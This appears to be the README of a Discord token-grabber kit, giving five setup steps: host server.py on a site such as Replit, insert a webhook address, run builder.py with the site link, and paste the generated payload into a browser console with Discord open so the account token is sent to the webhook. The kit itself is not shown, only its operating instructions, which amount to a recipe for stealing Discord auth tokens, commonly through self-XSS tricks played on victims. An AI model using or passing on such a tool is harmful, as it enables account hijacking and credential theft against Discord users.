1. upload the server.py to a site like https://replit.com or any other hoster you like to
2. replace in the server.py the text YOUR WEBHOOK with your webhook you want the token get sended to
3. start your website and copy the url of it
4. start the builder.py and input your website link 
5. now you can copy the given payload and put it into your browser console while having discord open in the tab to get your token sended to your webhook
